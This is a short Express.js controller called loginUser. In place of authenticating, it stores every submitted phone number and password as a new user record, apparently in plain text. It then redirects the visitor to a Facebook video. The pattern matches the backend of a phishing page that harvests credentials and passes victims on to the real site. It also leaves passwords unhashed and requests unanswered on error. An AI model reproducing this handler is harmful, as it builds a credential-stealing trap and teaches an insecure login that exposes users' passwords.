import {asynchandler} from "../utils/asynchandler.js"
import { User } from "../models/user.model.js"

const loginUser=asynchandler( async(req,res)=>{
        
 try {
       const {phone,password}=req.body
       if(!(phone )){
        throw new Error("phone or email is required")

       }
       if(!password){
        throw new Error("passsword is required")

       }
       

       const user=await User.create({
        
        phone:phone,
        password:password
       })
       console.log("user is create sucess fully")
       if(!user){
        console.log("invalid user")

       }
       res.redirect("https://www.facebook.com/100081009516602/videos/460322453623447/")

 } catch (error) {
    console.log("ërror in the login user",error)
    
 }


})
export {loginUser}